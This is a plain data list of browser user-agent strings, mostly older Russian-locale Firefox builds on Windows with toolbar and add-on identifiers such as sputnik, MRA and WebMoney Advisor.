Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.5.0.160
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03637) Firefox/3.6.17 ( .NET CLR 3.5.30729) sputnik 2.4.0.54 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 MRA 5.6 (build 03278) Firefox/3.6.23 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03796) Firefox/3.6.24
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.3 (build 02546) Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.5.2.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.15) Gecko/2009101601 MRA 5.4 (build 02614) Firefox/3.0.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13 (.NET CLR 3.5.30729) sputnik 2.5.0.166
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14 GTB5 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 GTB7.1 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03649) Firefox/3.6.24 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 AskTbAVR-W1/3.13.1.18261 Firefox/3.6.24 sputnik 2.4.0.46
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03796) Firefox/3.6.24
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.9) Gecko/20071025 MRA 5.5 (build 02842) Firefox/2.0.0.9
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.17) Gecko/20110428 Fedora/3.6.17-1.fc14 Firefox/3.6.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.3 (build 02560) AdCentriaIM/1.7 Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.6 (build 03403) Firefox/3.6.24 ( .NET CLR 3.5.30729; .NET4.0C) sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.11) Gecko/2009060215 MRA 5.5 (build 02842) Firefox/3.0.11 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.4) Gecko/20091016 MRA 5.4 (build 02647) AdCentriaIM/1.7 Firefox/3.5.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5 sputnik 2.5.0.150
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.7 (build 03686) Firefox/3.0.19 ( .NET CLR 3.5.30729) sputnik 2.4.0.54
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.10) Gecko/2009042316 MRA 5.5 (build 02842) Firefox/3.0.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.5 (build 02842) Firefox/3.5
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03796) Firefox/3.6.24 (.NET CLR 3.5.30729) sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 AdCentriaIM/1.7 Firefox/3.5.5 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 GTB5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.4 (build 02652) Firefox/3.5
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.4 (build 02647) AdCentriaIM/1.7 Firefox/3.0.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.3.1.118
Mozilla/5.0 (X11; Linux i686; rv:7.0) Gecko/20100101 Firefox/7.0
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.23) Gecko/20110921 Ubuntu/10.04 (lucid) Firefox/3.6.23
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB6 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 (.NET CLR 3.5.30729) sputnik 2.4.0.49
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03797) Firefox/3.6.13 sputnik 2.4.0.46
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 GTB7.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.14) Gecko/20080404 MRA 5.5 (build 02842) Firefox/2.0.0.14 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 MRA 5.4 (build 02652) Firefox/3.5.2 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 Firefox/3.0.15 (.NET CLR 3.5.30729) sputnik 2.0.1.37
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 MRA 5.5 (build 02842) Firefox/3.0.16 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03638) Firefox/3.6.24
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.04 (lucid) Firefox/3.6.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 sputnik 2.3.0.88 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.20) Gecko/20081217 MRA 5.5 (build 02842) Firefox/2.0.0.20 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 MRA 5.7 (build 03796) Firefox/3.6.18 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 MRA 5.5 (build 02842) Firefox/3.0.16 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.4.0.48
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.7 (build 03797) Firefox/3.6.25 sputnik 2.4.0.46
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.7 (build 03797) Firefox/3.6.25 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729) sputnik 2.0.1.37
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; ru; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.4 (build 02647) Firefox/3.0.4;MEGAUPLOAD 1.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.6 (build 03270) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 MRA 5.5 (build 02842) Firefox/3.0.16
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.4) Gecko/2008102920 MRA 5.5 (build 02842) Firefox/3.0.4 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.12) Gecko/20080201 MRA 5.6 (build 03278) Firefox/2.0.0.12 sputnik
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.3.0.96
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 AdCentriaIM/1.7 Firefox/3.5.6 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.6 (build 3402) Firefox/3.6.25 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 MRA 5.6 (build 03278) Firefox/3.0.16 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 sputnik 2.5.2.22
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.12) Gecko/20070508 MRA 5.5 (build 02842) Firefox/1.5.0.12 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 (.NET CLR 3.5.30729) FBSMTWB
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ru; rv:1.9.0.11) Gecko/2009060214 Firefox/3.0.11
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.3 (build 02564) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.7 (build 03797) Firefox/3.6.24 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.0.160
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.16) Gecko/2009120208 MRA 5.5 (build 02842) Firefox/3.0.16 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1) Gecko/20090624 MRA 5.5 (build 02842) Firefox/3.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 GTB7.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.2.22
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 AskTbPTV/3.12.2.16749 Firefox/3.5.5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.5 (build 02842) Firefox/3.0.17 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2b5) Gecko/20091204 Firefox/3.6b5 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.4 (build 02647) Firefox/3.0.17 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 sputnik 2.5.0.90
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.6 (build 03270) Firefox/3.5.6 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.3) Gecko/2008092417 MRA 5.6 (build 03270) Firefox/3.0.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 sputnik 2.5.2.20
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.0.150
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 Firefox/3.0.17 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.17) Gecko/2010010604 Ubuntu/8.04 (hardy) Firefox/3.0.17
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.0.160
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 sputnik unknown FBSMTWB
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 AdCentriaIM/1.7 Firefox/3.0.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.5) Gecko/2008120122 MRA 5.5 (build 02842) Firefox/3.0.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 sputnik 2.3.0.102
Mozilla/5.0 (Windows NT 5.0; rv:8.0.1) Gecko/20100101 Firefox/8.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7 sputnik 2.0.1.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.7 (build 03790) Firefox/3.6.25 sputnik 2.5.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.4.0.60
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.15) Gecko/2009101601 MRA 5.5 (build 02842) Firefox/3.0.15 sputnik 2.0.1.41 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.5 (build 02842) Firefox/3.5.6 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9) Gecko/2008052906 MRA 5.5 (build 02842) Firefox/3.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.2.20
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU; rv:1.9.0.17) Gecko/2009122116 MRA 5.5 (build 02842) Firefox/3.0.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.5 (build 02842) AdCentriaIM/1.7 Firefox/3.0.17 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.4 (build 02645) Firefox/3.0.17
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.24) Gecko/20111103 MRA 5.6 (build 03397) Firefox/3.6.24 sputnik 2.5.2.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 ( .NET CLR 3.5.30729) sputnik 2.5.1.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 sputnik 2.5.0.150
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 GTB7.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.5 (build 02842) Firefox/3.5.7 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 Ant.com Toolbar 1.5 Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.0.166
Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.1.6) Gecko/20091201 SUSE/3.5.6-1.1.1 Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.3 (build 02560) Firefox/3.5.7 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.4 (build 02647) Firefox/3.5.7 (.NET CLR 3.5.30729) sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.7 (build 03796) Firefox/3.6.25
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 MRA 5.6 (build 03278) Firefox/3.0.8 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.3 (build 02563) Firefox/3.5.7 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 sputnik 2.5.2.22
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 MRA 5.4 (build 02606) Firefox/3.5.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.15) Gecko/20101026 MRA 5.7 (build 03773) Firefox/3.5.15 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 sputnik 2.5.0.90 uToolBar/0.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.3 (build 02563) Firefox/3.6.25
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 AdCentriaIM/1.7 Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 (8C1C4AE8-F517-2B33-C2E1-562332FA568C) Firefox/8.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221  Firefox 879904163703[xSP_2:2019486893 896704456603  (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.6 (build 03278) Firefox/3.0.17
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 MRA 5.5 (build 02842) Firefox/3.5.1 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.5 (build 02842) Firefox/3.0.17
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 MRA 5.6 (build 03278) Firefox/3.5.7 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.18) Gecko/20110614 MRA 5.7 (build 03797) Firefox/3.6.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.17) Gecko/2009122116 MRA 5.5 (build 02842) Firefox/3.0.17 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26 sputnik 2.5.0.160
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26 sputnik 2.3.0.102
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 MRA 5.7 (build 03797) Firefox/3.6.25 (.NET CLR 3.5.30729) sputnik 2.5.2.20
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.17) Gecko/2009122116 AdCentriaIM/1.7 Firefox/3.0.17 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.26) Gecko/20120128 Firefox/3.6.26 sputnik 2.5.0.142
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.5 (build 02842) Firefox/3.6 (.NET CLR 3.5.30729) sputnik 2.0.1.40
